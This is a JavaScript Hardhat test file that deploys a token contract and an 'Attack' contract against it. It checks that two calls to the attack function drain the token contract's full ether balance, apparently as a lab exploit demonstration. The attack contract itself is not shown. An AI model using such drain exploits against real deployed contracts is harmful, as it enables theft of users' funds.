describe("Attack", function () {

  let owner, user1, user2, mytoken, attack;

  beforeEach(async function () {
    [owner, user1, user2] = await ethers.getSigners();
    const MyToken = await ethers.getContractFactory("MyToken");
    mytoken = await MyToken.deploy();
    console.log(`Mytoken address ${mytoken.address}`);

    const Attack = await ethers.getContractFactory("Attack");
    attack = await Attack.deploy(mytoken.address);
    await attack.deployed();
    console.log(`attack address ${attack.address}`);
  });

  it("attack", async function () {

    let ether_100 = ethers.utils.parseUnits("10", "ether");
    await mytoken.tokenBuy({ value: ether_100 });
    let amount1 = await ethers.provider.getBalance(mytoken.address);
    console.log("before attack ", amount1);

    let ether_10 = ethers.utils.parseUnits("1", "ether");
    await attack.att({ value: ether_10 });
    await attack.connect(user1).att({ value: ether_10 });
    let amount2 = await ethers.provider.getBalance(mytoken.address);
    console.log("after attack ", amount2);
    expect(amount2).to.equal(0);
  });
});
